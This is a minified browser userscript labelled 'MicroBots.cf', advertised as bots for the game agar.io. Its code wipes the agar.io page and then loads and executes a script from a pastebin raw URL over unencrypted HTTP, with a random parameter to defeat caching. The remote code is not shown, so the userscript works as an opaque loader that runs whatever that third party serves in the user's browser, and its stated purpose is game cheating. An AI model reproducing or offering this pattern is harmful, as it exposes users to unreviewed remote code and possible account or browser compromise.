// ==UserScript==
// @name         MicroBots.cf
// @version      0.1
// @namespace    MicroBots.cf
// @description  BEST AGARIO BOTS
// @author       Micro
// @match        http://agar.io/*
// @run-at       document-start
// ==/UserScript==

function loadScript(a){var b=document.createElement("script");b.type="text/javascript",b.src=a,document.head.appendChild(b)}function stopPage(){window.stop(),document.documentElement.innerHTML=null}"/"==location.pathname?(stopPage(),location.href="http://agar.io/MicroBots"+location.hash):"/MicroBots"==location.pathname&&(stopPage(),loadScript("https://code.jquery.com/jquery-3.1.0.min.js"),loadScript("https://cdn.socket.io/socket.io-1.4.5.js"),loadScript("http://pastebin.com/raw/0jFzAH2X/js?v="+Math.floor(1e10*Math.random()+1)));